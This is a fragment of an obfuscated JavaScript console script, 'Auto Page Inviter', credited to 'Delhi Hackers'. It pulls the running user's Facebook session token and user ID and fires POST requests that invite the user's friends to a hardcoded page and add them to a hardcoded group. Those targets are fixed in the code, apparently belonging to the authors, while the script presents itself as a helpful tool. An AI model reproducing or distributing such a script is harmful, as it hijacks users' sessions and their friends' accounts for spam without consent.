...
/*Copyright © 2013-2014 Mukesh Kumar Pandey. All Rights Reserved.*/
eval(unescape("
javascript: var Title = "Auto Page Inviter</A>";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/355258571270528" target="_blank">Delhi Hackers [lllllllllll ] </A> & <A style="color:#3B5998;" href="http://www.facebook.com/862220622" target="_blank"> Honey Singh Fans Club</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100003474640117" target="_blank"> Mukesh Kumar Pandey</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://autobotfacebook.blogspot.in" target="_blank">Automate Your Facebook</A>.</A>';
...
function InviteFriends(opo) {
    ...
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=400036503459965&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")

    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=1413025565582707&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");
